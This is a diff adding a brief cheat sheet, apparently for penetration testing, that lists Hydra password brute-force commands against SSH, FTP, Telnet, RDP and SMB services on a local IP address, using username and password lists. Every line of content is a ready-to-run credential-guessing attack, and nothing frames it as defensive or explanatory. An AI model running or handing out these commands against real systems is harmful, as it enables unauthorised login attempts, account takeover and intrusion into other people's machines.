@@ -1,0 +1,14 @@
+# SSH Brute Force (Single user, password list)
+hydra -l admin -P /path/to/passwords.txt ssh://192.168.0.103
+
+# FTP Brute Force (User list, password list, limited to 4 concurrent threads)
+hydra -L /path/to/users.txt -P /path/to/passwords.txt -t 4 ftp://192.168.0.103
+
+# Telnet Brute Force
+hydra -L /path/to/users.txt -P /path/to/passwords.txt telnet://192.168.0.103
+
+# RDP Brute Force (Windows Remote Desktop Protocol)
+hydra -l Administrator -P /path/to/passwords.txt rdp://192.168.0.103
+
+# SMB Brute Force (Windows Domain/Workgroup Authentication)
+hydra -l Administrator -P /path/to/passwords.txt smb://192.168.0.103
